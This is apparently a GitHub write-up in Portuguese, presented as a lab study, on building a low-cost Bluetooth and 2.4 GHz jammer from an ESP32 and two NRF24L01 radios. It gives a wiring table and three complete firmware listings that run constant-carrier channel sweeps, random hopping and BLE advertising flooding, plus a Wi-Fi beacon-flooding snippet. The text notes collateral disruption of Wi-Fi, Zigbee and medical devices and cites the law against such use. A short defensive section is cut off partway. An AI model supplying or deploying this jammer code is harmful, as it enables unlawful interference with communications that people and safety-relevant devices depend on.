
# **ESTUDO** - Interrompendo Comunicações Bluetooth Utilizando um Dispositivo de Baixo Custo

---

## :heavy_exclamation_mark::heavy_exclamation_mark:  ATENÇÃO - Aviso de Responsabilidade
> De **roodriiigooo (Autor)**: `> Este estudo foi conduzido em um laboratório isolado! A utilização deste tipo de dispositivo de forma não autorizada, sem supervisão ou feita de forma amadora é considerada crime segundo o artigo 183 da lei 9.472/1997 (LGT) e tem consequências. Portanto se busca reproduzir este estudo, certifique-se de que o ambiente é isolado e controlado. O autor não se responsabiliza por quaisquer atos irresponsáveis!`
> > Se tentar reproduzir, faça por conta, responsabilidade e risco. Você foi avisado ♥
> >
> > 
> > Para reproduzir este estudo é necessário conhecimento prévio das tecnologias aqui descritas, ferramentas e como utilizá-las.


## **Introdução**

O protocolo Bluetooth, amplamente utilizado para comunicação sem fio em dispositivos móveis e IoT, é projetado para operar em um ambiente ruidoso com mecanismos como salto de frequência e correção de erros. Apesar dessas características, é possível interromper ou degradar significativamente a comunicação Bluetooth utilizando um dispositivo de baixo custo, como um **ESP32** e módulos **NRF24L01**. Este estudo, apelidado de "Não Perturbe", explora a compreensão do funcionamento do Bluetooth e a construção de um jammer, sua implementação prática e estratégias para maximizar sua eficácia.

---

## **Objetivos**

1. Demonstrar a fragilidade e como é possível interromper comunicações Bluetooth utilizando dispositivos de baixo custo.
2. Explorar estratégias para maximizar a eficácia contra sistemas adaptativos.
3. Apresentar um código funcional para implementação prática (em laboratório).

---

## **Materiais Necessários**

- 1x ESP32 (com LED azul para indicação de status).
- 2x Módulos NRF24L01 ou NRF24L01 +PA +LNA com antena externa.
- 2x Capacitores eletrolíticos de 10uF a 100uf 16v. 
- Fios jumper Femea x Femea.
- Software Arduino IDE (com bibliotecas RF24 instaladas).
- 1x Telefone Celular (com recurso Bluetooth).
- 1x Caixa de som ou fones de ouvido com recurso Bluetooth.


## **Justificativa Para a Escolha Deste Hardware**

### **Por que o ESP32 WROOM DEVKIT V1?**
1. Capacidade de processamento e conectividade integrada.
2. Compatível com o Arduino IDE.
3. Baixo custo e amplo suporte da comunidade.

### **Por que NRF24L01 +PA + LNA?**
1. Faixa de 2.4 GHz com amplificador.
2. Sensibilidade melhorada.
3. Custo acessível.


---



## **Montagem do Laboratório**
Neste ponto iniciamos a montagem e programação do dispositivo que utilizaremos no estudo, tenha em mente que para replicar o estudo é necessário conhecimento básico sobre Arduino IDE e como instalar as bibliotecas necessárias. Abaixo a pinagem dos componentes para orientação inicial:

<div align="center">

<p align="center"><img src="https://github.com/roodriiigooo/NAO_PERTURBE/raw/main/img/pinout.jpg?raw=true" ></br> <em>Imagem: Ilustração da pinagem do ESP32 e NRF24L01</em> </p>

</div>



Faça a soldagem ou utilize os jumpers para conectar cada pino em sua respectiva posição seguindo a tabela (não se esqueça dos capacitores):


<div align="center">


| NRF24L01 | HSPI (ESP32) | VSPI (ESP32) | 100uf capacitor |
|---------------|------------------|------------------|--------------------|
| VCC           | 3.3V             | 3.3V             | (+) capacitor |
| GND           | GND              | GND              | (-) capacitor |
| CE            | GPIO 16          | GPIO 22          | |
| CNS           | GPIO 15          | GPIO 21          | |
| SCK           | GPIO 14          | GPIO 18          | |
| MOSI          | GPIO 13          | GPIO 23          | |
| MISO          | GPIO 12          | GPIO 19          | |
| IRQ           | Não Conectado    | Não Conectado    | |

</div>

<p align="center"><em>Tabela: Mostra a instalação dos módulos NRF24L01 usando HSPI e VSPI.</em></p>

<div align="center">

Ilustração simplificada para melhor entendimento da configuração demonstrada na **Tabela**:
<p align="center"><img src="https://github.com/roodriiigooo/NAO_PERTURBE/raw/main/img/pinout_1.jpg?raw=true" ></br> <em>Imagem: Ilustração da montagem do dispositivo</em> </p>


</div>



---


# **Configuração e Teoria**

O Bluetooth opera na faixa de **2.4 GHz** a **2.480 GHz**, dividida em **79 canais de 1 MHz**. Dispositivos Bluetooth utilizam **salto de frequência** para alternar entre canais até **1.600 vezes por segundo**, minimizando interferências.


## **Frequência de Operação**
1. Faixa de Frequência:
   - Bluetooth opera entre 2.4 GHz e 2.4835 GHz, dentro do espectro de frequência ISM (Industrial, Scientific and Medical), que é de uso livre na maioria dos países.
   - A faixa é dividida em 79 canais de 1 MHz cada.
2. Salto de Frequência (Frequency Hopping):
   - Para evitar interferências, o Bluetooth usa um sistema de salto de frequência adaptativo (AFH - Adaptive Frequency Hopping).
   - Alterna entre os canais disponíveis até 1.600 vezes por segundo, garantindo que o dispositivo não permaneça por muito tempo em um canal com interferência.



Os canais entre 0 e 79 no espectro de 2.400 GHz a 2.480 GHz correspondem à faixa de frequências ISM (Industrial, Scientific, and Medical), amplamente usada por diversos dispositivos de comunicação sem fio. Abaixo estão os serviços mais comuns que operam nessa faixa e como eles podem ser impactados pelo teste:

1. Wi-Fi (802.11 b/g/n)
   - Uso: Redes sem fio em 2.4 GHz.
Canais relevantes:
Wi-Fi utiliza 14 canais sobrepostos (exceto no Japão, onde é permitido até o canal 14). Cada canal tem largura de 22 MHz.
Canais mais comuns: 1 (2.412 GHz), 6 (2.437 GHz) e 11 (2.462 GHz), que são os únicos não sobrepostos.
Impacto:
O teste pode gerar interferência nas redes Wi-Fi próximas, especialmente se o rádio NRF24L01 usar canais que coincidam ou se aproximem da frequência central dos canais Wi-Fi.
Interferências podem causar:
Queda de desempenho na internet.
Atrasos em transmissões de vídeo ou voz.
Perda temporária de conexão.
2. Dispositivos Bluetooth
   - Uso: Comunicação ponto-a-ponto (teclados, mouses, fones de ouvido, caixas de som, etc.).
Canais relevantes:
Bluetooth usa 79 canais de 1 MHz entre 2.400 GHz e 2.480 GHz.
Opera com salto de frequência (frequency hopping) para minimizar interferência, trocando de canal até 1.600 vezes por segundo.
Impacto:
O teste pode temporariamente colidir com os canais Bluetooth, resultando em:
Áudio cortado ou travado em dispositivos como fones de ouvido.
Desempenho lento em transferências de dados.
Reconexões frequentes.
O impacto é maior em dispositivos Bluetooth que estão em uso intensivo, como streaming de áudio.
3. Redes Zigbee (IoT)
   - Uso: Comunicação de dispositivos IoT, como sensores domésticos inteligentes, lâmpadas, e controladores.
Canais relevantes:
Zigbee usa 16 canais dentro da faixa de 2.4 GHz (canais 11-26).
Cada canal tem largura de 2 MHz e está mais concentrado entre 2.405 GHz e 2.480 GHz.
Impacto:
O teste pode afetar temporariamente a comunicação de dispositivos IoT, causando atrasos ou falhas na troca de dados entre sensores e controladores.
4. Telefones sem fio (2.4 GHz)
   - Uso: Telefones residenciais sem fio (em declínio, mas ainda usados).
Canais relevantes:
Ocupam uma faixa ampla em 2.4 GHz, muitas vezes sem padrão definido.
Impacto:
O teste pode gerar ruídos ou perda temporária de sinal.
5. Outros dispositivos ISM
   - Uso: Equipamentos como drones, câmeras de segurança sem fio, controles remotos, dispositivos **médicos**.
Canais relevantes:
Dependem do dispositivo, mas geralmente ocupam canais na faixa de 2.4 GHz.
Impacto:
O teste pode interferir na transmissão de dados ou controle remoto desses dispositivos.


##  **Mecanismos de Contingência para Minimização de Ruído**
Bluetooth utiliza diversas estratégias para minimizar os impactos de ruído e interferências, garantindo uma comunicação confiável:

1. **Frequency-Hopping Spread Spectrum (FHSS) e Adaptive Frequency Hopping (AFH)**
   - FHSS (Frequency-Hopping Spread Spectrum):
      - Definição: FHSS é uma técnica de modulação de espectro espalhado onde o transmissor e o receptor alternam entre diferentes frequências (ou canais) de forma pseudoaleatória, sincronizados por uma sequência pré-definida.
      - Características:
        - Constância:
          - O padrão de salto é fixo e predefinido para ambos os dispositivos.
        - Taxa de Salto:
          - Frequências são alteradas a uma taxa regular, geralmente várias vezes por segundo.
        - Resistência ao Ruído:
          - Como o sinal salta entre canais, é menos provável que seja afetado por interferências contínuas em uma única frequência.
        - Simplicidade:
          - A técnica é simples de implementar, mas não considera as condições de interferência em tempo real.
      - Vantagens:
        - Oferece boa proteção contra interferências fixas.
        - Funciona bem em ambientes onde o ruído é estático ou distribuído uniformemente.
      - Desvantagens:
        - Ineficaz contra interferências adaptativas, pois não avalia a qualidade dos canais.
      - Uso:
        - FHSS é usado em tecnologias mais antigas como o **Bluetooth Clássico (v1.0 a v2.0)**.
   
   - AFH (Adaptive Frequency Hopping):
      - Definição: AFH é uma técnica de salto de frequência que ajusta dinamicamente o padrão de salto com base na qualidade dos canais. Ele evita canais com interferência e concentra-se nos canais limpos.
      - Características:
        - Dinamicidade:
          - O padrão de salto não é fixo; é ajustado dinamicamente com base em medições de interferência.
        - Qualidade dos Canais:
          - Dispositivos analisam o espectro e excluem canais com alta interferência (ex.: Wi-Fi ou outros dispositivos Bluetooth).
        - Melhor Eficiência:
          - A transmissão evita colisões e aproveita melhor o espectro disponível.
      - Vantagens:
        - Reduz significativamente o impacto de interferências em ambientes densos.
        - Otimiza a qualidade da conexão em tempo real.
        - É compatível com sistemas coexistentes (ex.: Wi-Fi em 2.4 GHz).
      - Desvantagens:
        - Maior complexidade de implementação em comparação ao FHSS.
        - Pode consumir mais recursos computacionais para análise de espectro.
      - Uso:
        - AFH é usado em **Bluetooth a partir da versão 1.2** e no **Bluetooth Low Energy (BLE)**


<div align="center">


| Aspecto | FHSS	 | AFH |
|---------------|------------------|--------------------|
| Padrão de Salto	| Fixo e predefinido	  | Dinâmico e ajustado em tempo real |
| Análise de Canais	| Não realiza	 | Realiza para evitar canais ruins |
| Resistência a Ruído | Moderada  | Alta |
| Complexidade  | Simples          | Alta |
| Interferência  | Afetado por fontes adaptativas | Menos afetado |
| Exemplos de Uso | Bluetooth Clássico v1.0/v1.1 | Bluetooth v1.2+, BLE |


</div>

<p align="center"><em>Quadro comparativo entre as duas tecnologias.</em></p>



3. **Forward Error Correction (FEC)**
   - Como Funciona:
     - Dados transmitidos incluem bits adicionais para detectar e corrigir erros causados por ruído no canal.
     - Utiliza algoritmos de correção como Hamming Code e CRC (Cyclic Redundancy Check).
   - Benefício:
     - Permite recuperar informações danificadas sem a necessidade de retransmissão, otimizando a comunicação.
4. **Potência de Transmissão Adaptativa**
   - Como Funciona:
     - O Bluetooth ajusta automaticamente a potência de transmissão para o nível mínimo necessário para manter a comunicação.
     - Reduz interferências com outros dispositivos e economiza energia.
   - Benefício:
     - Minimiza o consumo de energia e a interferência com outros dispositivos na mesma faixa.
5. **Redundância de Dados**
   - Como Funciona:
     - Pacotes de dados podem ser duplicados e enviados novamente se não forem confirmados pelo receptor.
     - Em sistemas BLE (Bluetooth Low Energy), isso ocorre em níveis diferentes para otimizar o desempenho.
   - Benefício:
     - Garante alta confiabilidade na transmissão, especialmente em ambientes ruidosos.
6. **Modulação GFSK**
   - Como Funciona:
     - O Bluetooth clássico utiliza a modulação Gaussian Frequency-Shift Keying (GFSK), que é eficiente em termos de espectro e resistente ao ruído.
     - O BLE (Bluetooth Low Energy) utiliza modulação Gaussian Minimum Shift Keying (GMSK) para eficiência energética e estabilidade.
   - Benefício:
     - Reduz a susceptibilidade ao ruído e melhora a eficiência espectral.

## **Perfis de Uso**
Bluetooth suporta vários perfis para diferentes tipos de aplicações:
   - A2DP (Advanced Audio Distribution Profile): Streaming de áudio em alta qualidade.
   - HFP (Hands-Free Profile): Comunicação de voz, como chamadas telefônicas.
   - GATT (Generic Attribute Profile): Transmissão de dados em BLE, usado em dispositivos IoT e sensores.

## **Desafios e Limitações**
Apesar dos mecanismos de contingência, Bluetooth enfrenta desafios em ambientes de alta densidade de dispositivos:
1. **Interferências em Ambientes Ruidosos:**
   - Embora o AFH reduza a interferência, em locais com muitos dispositivos na faixa de 2.4 GHz, a comunicação pode ser degradada.
2. **Impacto do Multipercurso:**
   - Reflexões de sinal em ambientes internos podem causar cancelamento ou atenuação de sinais.
3. **Alcance Limitado:**
   - Em ambientes abertos, o alcance médio (depende de hardware) pode ser de até 100 metros (com potência máxima), mas é significativamente menor em ambientes internos.

---

## **Implementação da Firmware - Estratégias A, B e C**

### **Estratégia A. - Cobertura Dividida**
1. **Sinal de Emissão Contínua**:
   - Utiliza o método `startConstCarrier()` para gerar um sinal constante em cada canal, saturando-o.
2. **Saltos de Canal Aleatórios**:
   - Implementação de saltos imprevisíveis para cobrir toda a faixa Bluetooth, dificultando a recuperação de dispositivos adaptativos.
3. **Divisão de Faixa**:
   - Dois rádios NRF24L01 são usados simultaneamente, cobrindo metade dos canais cada, garantindo cobertura rápida.
4. **Potência e Taxa de Transmissão Máximas:**
   - Configuração dos módulos para `RF24_PA_MAX` e `RF24_2MBPS` para máxima intensidade e velocidade de interferência.


### **Implementação da Firmware - Código Fonte**
Utilize a Arduinno IDE:
```cpp
#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Configurações para dois módulos NRF24L01
SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(16, 15, 16000000);   // HSPI
RF24 radio1(22, 21, 16000000);  // VSPI

// Configurações de canais e controle
int ch_hspi = 0;  // Canal inicial para HSPI (0-39)
int ch_vspi = 40; // Canal inicial para VSPI (40-78)
bool flag_hspi = false;  // Direção de salto HSPI
bool flag_vspi = true;   // Direção de salto VSPI

// Pino do LED azul para indicação
const int ledPin = 2;
bool hasError = false;  // Indicador de erro

// Função de configuração inicial
void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW); // Inicialmente o LED está apagado
  Serial.begin(115200);

  // Desativa Wi-Fi e Bluetooth do ESP32
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  // Inicializa os rádios NRF24L01
  if (!initHP() || !initSP()) {
    hasError = true; // Marca erro se algum rádio falhar
  }
}

// Inicializa o rádio no barramento VSPI
bool initSP() {
  sp = new SPIClass(VSPI);
  sp->begin();
  if (radio1.begin(sp)) {
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.startConstCarrier(RF24_PA_MAX, ch_vspi); // Sinal contínuo
    return true;
  } else {
    Serial.println("Erro ao inicializar VSPI");
    return false;
  }
}

// Inicializa o rádio no barramento HSPI
bool initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();
  if (radio.begin(hp)) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, ch_hspi); // Sinal contínuo
    return true;
  } else {
    Serial.println("Erro ao inicializar HSPI");
    return false;
  }
}

// Função para gerar payloads e alternar canais
void jammerSweepBluetooth() {
  // Alterna canal no HSPI
  if (flag_hspi) {
    ch_hspi -= random(1, 3); // Decremento aleatório
    if (ch_hspi < 0) {
      ch_hspi = random(1, 5);
      flag_hspi = false;
    }
  } else {
    ch_hspi += random(1, 3); // Incremento aleatório
    if (ch_hspi > 39) {
      ch_hspi = 39;
      flag_hspi = true;
    }
  }
  radio.setChannel(ch_hspi);
  
  // Alterna canal no VSPI
  if (flag_vspi) {
    ch_vspi -= random(2, 5); // Decremento aleatório
    if (ch_vspi < 40) {
      ch_vspi = 40;
      flag_vspi = false;
    }
  } else {
    ch_vspi += random(2, 5); // Incremento aleatório
    if (ch_vspi > 78) {
      ch_vspi = 78;
      flag_vspi = true;
    }
  }
  radio1.setChannel(ch_vspi);
}

// Indicação de erro com LED piscando
void indicateError() {
  digitalWrite(ledPin, HIGH);
  delay(500);
  digitalWrite(ledPin, LOW);
  delay(500);
}

// Loop principal
void loop() {
  if (hasError) {
    indicateError(); // Pisca LED em caso de erro
  } else {
    digitalWrite(ledPin, HIGH); // LED ligado para operação normal
    jammerSweepBluetooth();     // Executa lógica de interferência
  }
}
```

---


### **Estratégia B. - Cobertura Simultânea**

1. Unificar os dois rádios para:
   - Operar no mesmo canal de forma sincronizada, reforçando a intensidade do ruído.
2. Cobertura Aleatória:
   - Alternar os 79 canais de forma simultânea e aleatória, para maximizar a cobertura em toda a faixa Bluetooth.
3. Interferência Combinada:
   - Uso simultâneo de `startConstCarrier()` e transmissão de payloads `(write())`.
4. Simplicidade:
   - O código elimina a necessidade de lógica separada para HSPI e VSPI, simplificando a implementação.
5. **Potência e Taxa de Transmissão Máximas:**
   - Configuração dos módulos para `RF24_PA_MAX` e `RF24_2MBPS` para máxima intensidade e velocidade de interferência.


### **Implementação da Firmware - Código Fonte**
Utilize a Arduinno IDE:
```cpp
#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Configurações para dois módulos NRF24L01
SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(16, 15, 16000000);   // HSPI
RF24 radio1(22, 21, 16000000);  // VSPI

// Configuração de canais e controle
int current_channel = 0;  // Canal atual (0-78)
const int max_channel = 78; // Canal máximo

// Pino do LED azul para indicação
const int ledPin = 2;
bool hasError = false;  // Indicador de erro

// Função de configuração inicial
void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW); // Inicialmente o LED está apagado
  Serial.begin(115200);

  // Desativa Wi-Fi e Bluetooth do ESP32
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  // Inicializa os rádios NRF24L01
  if (!initHP() || !initSP()) {
    hasError = true; // Marca erro se algum rádio falhar
  }
}

// Inicializa o rádio no barramento VSPI
bool initSP() {
  sp = new SPIClass(VSPI);
  sp->begin();
  if (radio1.begin(sp)) {
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.startConstCarrier(RF24_PA_MAX, current_channel); // Sinal contínuo
    return true;
  } else {
    Serial.println("Erro ao inicializar VSPI");
    return false;
  }
}

// Inicializa o rádio no barramento HSPI
bool initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();
  if (radio.begin(hp)) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, current_channel); // Sinal contínuo
    return true;
  } else {
    Serial.println("Erro ao inicializar HSPI");
    return false;
  }
}

// Função para gerar payloads e alternar canais aleatorios
void jammerSweepBluetooth() {
  current_channel = random(0, max_channel + 1);
  radio.setChannel(current_channel);
  radio1.setChannel(current_channel);
}

// Indicação de erro com LED piscando
void indicateError() {
  digitalWrite(ledPin, HIGH);
  delay(500);
  digitalWrite(ledPin, LOW);
  delay(500);
}

// Loop principal
void loop() {
  if (hasError) {
    indicateError(); // Pisca LED em caso de erro
  } else {
    digitalWrite(ledPin, HIGH); // LED ligado para operação normal
    jammerSweepBluetooth();     // Executa lógica de interferência
  }
}


```


### Em comparativo com `Estratégia A`, vantagens de não separar a cobertura:
   - Maior Potência em Cada Canal:
     - Ambos os rádios contribuem para saturar o mesmo canal, dificultando ainda mais a comunicação Bluetooth.
   - Menor Latência de Mudança:
     - Não há necessidade de cálculos ou ajustes independentes de canais, tornando os saltos mais rápidos.

### Desvantagem Potencial
   - Menor Cobertura Simultânea:
     - Como ambos os rádios operam no mesmo canal, não há divisão de carga para cobrir dois canais ao mesmo tempo.


---


### **Estratégia C. - Utilizar os Transmissores do ESP32 em conjunto com NRF24L01**
1. **Bluetooth LE Advertising Bombing:**
   - Enviar pacotes de anúncio BLE (Bluetooth Low Energy) continuamente, ocupando os canais publicitários (37, 38 e 39) e impedindo conexões BLE de se estabelecerem.
2. **(Sugestão não implementada) Wi-Fi Beacon Flooding:**
   - Enviar quadros beacon ou pacotes de dados fictícios em todos os canais Wi-Fi (1 a 11), gerando ruído que interfere diretamente na faixa de 2.4 GHz.
3. **Transmissão Simultânea:**
   - Utilizar os rádios NRF24L01, o Bluetooth e o Wi-Fi (Não implementado) do ESP32 simultaneamente para gerar interferência ampla e densa.


O código abaixo mostra como configurar o ESP32 para operar em modo Bluetooth, gerando interferência adicional à gerada pelos módulos NRF24L01:


### **Implementação da Firmware - Código Fonte**
Utilize a Arduinno IDE:
```cpp
#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"

// Configurações para dois módulos NRF24L01
SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(16, 15, 16000000);   // HSPI
RF24 radio1(22, 21, 16000000);  // VSPI

// Configurações de canais e controle
int ch_hspi = 0;  // Canal inicial para HSPI (0-39)
int ch_vspi = 40; // Canal inicial para VSPI (40-78)
bool flag_hspi = false;  // Direção de salto HSPI
bool flag_vspi = true;   // Direção de salto VSPI

// Pino do LED azul para indicação
const int ledPin = 2;
bool hasError = false;  // Indicador de erro

// Função de configuração inicial
void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW); // Inicialmente o LED está apagado
  Serial.begin(115200);

  // Desativa Wi-Fi e Bluetooth do ESP32
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  // Inicializa os rádios NRF24L01
  if (!initHP() || !initSP()) {
    hasError = true; // Marca erro se algum rádio falhar
  }
}

// Inicializa o rádio no barramento VSPI
bool initSP() {
  sp = new SPIClass(VSPI);
  sp->begin();
  if (radio1.begin(sp)) {
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.startConstCarrier(RF24_PA_MAX, ch_vspi); // Sinal contínuo
    return true;
  } else {
    Serial.println("Erro ao inicializar VSPI");
    return false;
  }
}

// Inicializa o rádio no barramento HSPI
bool initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();
  if (radio.begin(hp)) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, ch_hspi); // Sinal contínuo
    return true;
  } else {
    Serial.println("Erro ao inicializar HSPI");
    return false;
  }
}

// Inicia BLE Advertising Bombing
void startBLEInterference() {
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  esp_bluedroid_init();
  esp_bluedroid_enable();

  esp_ble_adv_params_t adv_params = {
      .adv_int_min = 0x20,
      .adv_int_max = 0x40,
      .adv_type = ADV_TYPE_NONCONN_IND,
      .channel_map = ADV_CHNL_ALL};

  uint8_t adv_data[] = {'B', 'A', 'Z', 'I', 'N', 'G', 'A'};
  esp_ble_gap_config_adv_data_raw(adv_data, sizeof(adv_data));
  esp_ble_gap_start_advertising(&adv_params);
}

// Função para gerar payloads e alternar canais
void jammerSweepBluetooth() {
  // Alterna canal no HSPI
  if (flag_hspi) {
    ch_hspi -= random(1, 3); // Decremento aleatório
    if (ch_hspi < 0) {
      ch_hspi = random(1, 5);
      flag_hspi = false;
    }
  } else {
    ch_hspi += random(1, 3); // Incremento aleatório
    if (ch_hspi > 39) {
      ch_hspi = 39;
      flag_hspi = true;
    }
  }
  radio.setChannel(ch_hspi);
  
  // Alterna canal no VSPI
  if (flag_vspi) {
    ch_vspi -= random(2, 5); // Decremento aleatório
    if (ch_vspi < 40) {
      ch_vspi = 40;
      flag_vspi = false;
    }
  } else {
    ch_vspi += random(2, 5); // Incremento aleatório
    if (ch_vspi > 78) {
      ch_vspi = 78;
      flag_vspi = true;
    }
  }
  radio1.setChannel(ch_vspi);
  startBLEInterference();
}

// Indicação de erro com LED piscando
void indicateError() {
  digitalWrite(ledPin, HIGH);
  delay(500);
  digitalWrite(ledPin, LOW);
  delay(500);
}

// Loop principal
void loop() {
  if (hasError) {
    indicateError(); // Pisca LED em caso de erro
  } else {
    digitalWrite(ledPin, HIGH); // LED ligado para operação normal
    jammerSweepBluetooth();     // Executa lógica de interferência
  }
}

```

Para controlar o recurso WiFi, ajuste o código de forma que:

```cpp

// Inicia Wi-Fi Beacon Flooding
void startWiFiInterference() {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t ap_config = {};
  strcpy((char *)ap_config.ap.ssid, "INTERNET"); // Nome do ponto de acesso
  ap_config.ap.channel = 1; // Canal de operação, alterne dinamicamente (1 a 11)
  ap_config.ap.authmode = WIFI_AUTH_OPEN;
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
}

```

Com este ajuste torna-se possível expandir a geraração ruído através para o módulo WiFi integrado da ESP32.

---

### Em comparativo com `Estratégia A e B:`
   - Interferência Wi-Fi com Beacon Flooding:
     - O ESP32 é configurado como um ponto de acesso (AP) que transmite pacotes beacon continuamente.
     - Os canais Wi-Fi são alternados dinamicamente para gerar interferência ampla na banda de 2.4 GHz.
   - Interferência Bluetooth (BLE Advertising Bombing):
     - O ESP32 envia pacotes de anúncio BLE continuamente nos canais publicitários (37, 38, 39).
   - Interferência com NRF24L01:
     - Os dois módulos NRF24L01 são usados para gerar ruído nos canais Bluetooth (0-78) por meio de transmissão contínua e envio de payloads aleatórios.


### Desvantagem Potencial
   - Aquecimento da ESP32:
     - Devida a alta carga de trabalho, superaquecimento dos componentes poderá ser observada.

### Impacto no Bluetooth
   - Bluetooth Clássico:
     - Beacon flooding e sinais NRF24L01 saturam a banda, dificultando o salto de frequência.
   - Bluetooth Low Energy (BLE):
     - Advertising bombing ocupa os canais publicitários críticos, impedindo novos emparelhamentos e comunicação.


---


Todos os códigos (`Estratégias A, B e C`) são capazes de testar canais entre 2 e 79. Esses valores estão dentro da faixa suportada pelos rádios NRF24L01, que operam entre 2.400 GHz e 2.525 GHz, divididos em 128 canais numerados de 0 a 127, cada um separado por 1 MHz.
Com esta programação, o dispositivo gerado no laboratório pode interferir principalmente em Wi-Fi, Bluetooth, Zigbee e dispositivos ISM. A gravidade varia com proximidade, potência, e condições do ambiente.


Através da `Estratégia C` também é possível utilizar os transmissores Wi-Fi e Bluetooth integrados no ESP32 para gerar ruído adicional e melhorar a eficiência na interrupção de comunicações Bluetooth. O ESP32, por sua arquitetura versátil, permite a manipulação direta de seus transmissores possibilitando:
1. Através do Transmissor Bluetooth:
   - Operar o Bluetooth do ESP32 em um estado de envio contínuo ou utilizando comandos para saturar o espectro de frequência.
2. Através do Transmissor Wi-Fi:
   - Ser configurado para criar pacotes contínuos ou ruído ativo na banda de 2.4 GHz, que também é utilizada pelo Bluetooth.
3. NRF24L01 e sua faixa de operação:
   - Cada canal corresponde a uma frequência, calculada como 2.400 GHz + **n** x 1 MHz, onde **n** é o número do canal.
     - Exemplos:
       - Canal 2: 2.400 GHz + 2 MHz = 2.402 GHz
       - Canal 79: 2.400 GHz + 79MHz = 2.479 GHz
4. Canais fora do intervalo 2-79:
   - Embora o NRF24L01 suporte canais de 0 a 127, o código está configurado para operar principalmente dentro da faixa de 2 a 79, porque canais muito baixos (0-1) ou altos (80-127) não serão usados para evitar interferências com outras aplicações (e fugir do escopo do estudo).


Antes de transferir o código para o ESP32 ou após transferido, antes de liga-lo/reiniciar, reproduza um audio no telefone celular e efetue o pareamento com um dispositivo bluetooth de forma em que o dispositivo reproduza o audio.
Um apreamento com outros dispositivos com o mesmo propósito pode ser feito em conjunto, desde que estejam próximos.

Inicie sua ESP32.


### **Testes Recomendados**
1. Confirmação de Cobertura:
   - Use um analisador de espectro para verificar a presença de sinais nos canais Bluetooth (0-78).
2. Impacto em Dispositivos Bluetooth:
   - Teste a degradação da conexão em fones de ouvido, caixas de som e outros dispositivos Bluetooth próximos.
3. Estabilidade de Longa Duração:
   - Execute o sistema continuamente para validar sua estabilidade.

---


## **Resultados Esperados**

1. **Interferência Contínua**:
   - Comunicação Bluetooth em dispositivos próximos será degradada ou interrompida.
   - Comunicação em dispositivos próximos que utilizam a mesma faixa de frequência do estudo será degradada ou interrompida.

2. **Eficiência Contra Sistemas Adaptativos**:
   - A lógica de saltos aleatórios e emissão contínua dificulta a recuperação de dispositivos adaptativos.

3. **Cobertura Completa**:
   - Todos os canais Bluetooth (0-78) são cobertos rapidamente por dois rádios operando simultaneamente.

---

## **Como se Proteger Contra Este Tipo de Ataque**

Embora este estudo explore a implementação de um jammer, é igualmente importante entender como proteger dispositivos contra esse tipo de ataque. Dispositivos que utilizam o protocolo Bluetooth podem implementar as seguintes práticas e tecnologias para minimizar os impactos de interferências maliciosas:

### **1. Uso de Frequências Adicionais**
- Implementar suporte ao **Bluetooth 5.0 ou superior**, que pode utilizar canais publicitários adicionais e redundância para minimizar os impactos da interferência.

### **2. Ajuste Dinâmico da Potência de Transmissão**
- Dispositivos podem ajustar automaticamente a potência de transmissão para superar a intensidade do sinal interferente.

### **3. Salto de Frequência Não Previsível**
- Aumentar a taxa de salto de frequência para além de 1.600 saltos por segundo e garantir que os saltos sejam baseados em padrões imprevisíveis.

### **4. Mecanismos de Correção de Erros**
- Protocolos avançados de correção de erros, como **FEC (Forward Error Correction)**, podem ajudar a recuperar pacotes perdidos ou danificados.

### **5. Detecção e Mitigação de Interferência**
- Alguns dispositivos podem detectar interferências e mudar automaticamente para canais ou faixas de frequência menos congestionados.

### **6. Operação em Frequências Alternativas**
